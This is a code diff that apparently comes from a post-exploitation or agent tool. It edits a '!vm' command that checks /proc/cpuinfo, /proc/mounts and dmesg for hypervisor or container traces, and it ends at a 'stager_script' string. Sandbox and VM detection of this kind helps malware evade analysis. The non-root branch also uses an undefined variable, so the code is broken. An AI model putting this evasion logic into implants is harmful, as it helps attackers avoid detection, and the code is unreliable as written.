@@ -358,14 +358,22 @@ class VM(Command):
     def usage():
         return "Usage: !vm"
     def execute(self):
-        test_vm = shell_exec('cat /proc/cpuinfo | grep hypervisor', print_output=False)
-        test_vm_1 = shell_exec('cat /proc/mounts | grep -E "docker|overlay|lxc"', print_output=False)
-        test_vm_2 = shell_exec('dmesg | grep -i hypervisor', print_output=False)
-        if len(test_vm) == 0 and len(test_vm_1) == 0 and len(test_vm_2) == 0:
-            write_str("Virtual Machine: No\r\n", LogLevel.WARNING)
+        if shell_exec("whoami") == 'root':
+            test_vm = shell_exec('cat /proc/cpuinfo | grep hypervisor', print_output=False)
+            test_vm_1 = shell_exec('cat /proc/mounts | grep -E "docker|overlay|lxc"', print_output=False)
+            test_vm_2 = shell_exec('dmesg | grep -i hypervisor', print_output=False)
+            if len(test_vm) == 0 and len(test_vm_1) == 0 and len(test_vm_2) == 0:
+                write_str("Virtual Machine: No\r\n", LogLevel.WARNING)
+            else:
+                write_str("Virtual Machine: Yes\r\n", LogLevel.ERROR)
         else:
-            write_str("Virtual Machine: Yes\r\n", LogLevel.ERROR)
-
+            test_vm = shell_exec('cat /proc/cpuinfo | grep hypervisor', print_output=False)
+            test_vm_1 = shell_exec('cat /proc/mounts | grep -E "docker|overlay|lxc"', print_output=False)
+            if len(test_vm) == 0 and len(test_vm_1) == 0 and len(test_vm_2) == 0:
+                write_str("Virtual Machine: No\r\n", LogLevel.WARNING)
+            else:
+                write_str("Virtual Machine: Yes\r\n", LogLevel.ERROR)
+                
 class StrangeDirs(Command):
     stager_script = """
 import sys 
